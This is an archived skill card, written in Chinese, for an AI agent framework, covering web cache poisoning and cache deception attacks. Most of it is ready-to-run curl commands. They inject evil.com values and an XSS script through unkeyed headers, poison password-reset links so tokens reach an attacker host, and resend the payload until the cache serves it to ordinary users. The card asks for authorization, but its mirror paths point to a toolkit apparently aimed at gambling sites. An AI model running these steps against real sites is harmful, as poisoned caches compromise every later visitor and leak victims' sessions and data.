<!-- archived from /root/.hermes/skills/security/web-cache-attacks/SKILL.md on 2026-10-21 -->

---
name: web-cache-attacks
description: "Web缓存投毒/欺骗测试时使用。触发: 缓存投毒, cache poisoning, 未键控头, 缓存欺骗。"
version: 1.0.0
license: MIT
author: hermes-curator
metadata:
  hermes:
    tags: [pentest, cache, poisoning, deception, unkeyed, x-forwarded-host, surveyengine-absorbed]
    related_skills: [http-smuggling-protocol-abuse, web-logic-bypass-family, surveyengine-knowledge-pack]
---

> 归档卡：原目录 `/root/.hermes/skills/security/web-cache-attacks`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/web-cache-attacks/…')`，不要相对 `references/legacy/` 解析。

# Web 缓存投毒 / 缓存欺骗 (Cache Poisoning & Deception)

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收(镜像 `.cursor\skills\web-cache-poisoning\SKILL.md`,web-cache-deception 已并入本卡)。

## §1 原理
- **缓存投毒**: 缓存键=Host+Path+部分参数;**未键控头**(不在缓存键但影响响应内容)注入恶意值 → 响应被缓存 → 所有用户收到带毒响应
- **缓存欺骗**: 诱导用户访问 `/profile/nonexistent.css` → CDN 当静态文件缓存 → 后续访客读到受害者响应
- ⚠️ 投毒影响所有后续用户,**操作前确认案卷,出证据即清除**

## §2 快速检测(未键控头探测)
```bash
# 每种头 + cache-buster(避免读到缓存结果)
curl -s "https://TARGET/?cb=12345" -H "X-Forwarded-Host: evil.com" | grep -i evil
curl -s "https://TARGET/?cb=12345" -H "X-Forwarded-Scheme: nothttps" | grep -iE "evil|nothttps"
curl -s "https://TARGET/?cb=12345" -H "X-Host: evil.com" | grep -i evil
# Burp Param Miner → Guess Headers 自动找未键控头
```

## §3 Host 头注入投毒
```bash
# Host 在响应中反射的 3 大场景:
# 1. 密码重置邮件链接 → Host: evil.com → 邮件链接 https://evil.com/reset?token=...
# 2. OAuth redirect_uri 基于 Host
# 3. JS 资源 <script src="//HOST/js/app.js"> 被缓存 → 用户加载 evil.com JS(XSS)
curl -s -X POST "https://TARGET/api/password/reset" -H "Host: evil.com" -d '{"email":"<EMAIL-REDACTED>"}'
```

## §4 X-Forwarded-Host 投毒(XSS)
```bash
# 反射到响应 → 注入 payload
curl -s "https://TARGET/" -H 'X-Forwarded-Host: evil.com"><script>alert(1)</script>'
# 找到反射后持久化: 移除 cache-buster → 多次发送直到被缓存(Surrogate-Control/Cache-Control max-age>0) → 正常用户触发
```

## §5 Fat GET(GET + Body)投毒
- 某些框架支持 GET 带 body,CDN 按 GET 方法缓存 → body 参数不在缓存键 → 可注入

## §6 缓存欺骗
```bash
# /account/nonexistent.css 路径混淆 → 个人页被 CDN 缓存 → 他人访问读到受害者账户页
curl -s "https://TARGET/account/anything.css"  # 返回 200 账户页而非 404?
# 检测: X-Cache: hit / Age 头 / 响应含登录后内容但无 cookie
```

## 成功口径
| 档 | 成立 | 不算 |
|----|------|------|
| L1 | 找到未键控头且注入值反射 | 只有缓存头 |
| L2 | 带毒响应被缓存,无 cookie 请求读到 | 仅反射未缓存 |
| L3 | 受害者会话/数据经缓存泄露(欺骗)或 XSS 投毒落地 | — |

## 纪律
- 投毒影响其他用户 → 授权内做,证明即清(发 cache-buster 请求或等待 TTL)
- 缓存欺骗用自己账号验证,不读他人数据

## 完整情报
镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\web-cache-poisoning\SKILL.md`(222行)
